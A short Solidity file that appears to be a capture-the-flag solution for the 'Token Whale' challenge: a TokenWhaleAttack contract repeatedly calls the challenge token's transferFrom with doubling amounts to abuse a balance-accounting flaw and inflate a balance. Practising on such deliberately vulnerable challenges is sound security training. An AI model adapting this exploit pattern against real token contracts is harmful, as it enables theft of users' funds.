///SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface TokenWhaleChallenge {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;
}

contract TokenWhaleAttack {
    // save gass by providing the balance and never reading it
    function attack(address tokenAddress, uint256 initialBalance) external {
        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(
            tokenAddress
        );
        uint256 amount = initialBalance;
        for (uint256 i = 0; i < 10; i++) {
            tokenWhaleChallenge.transferFrom(msg.sender, msg.sender, amount);
            amount *= 2;
        }

        // or
        // for (uint256 i = initialBalance; i <= 512000; i *= 2) {
        //     tokenWhaleChallenge.transferFrom(msg.sender, msg.sender, i);
        // }
        
    }
}
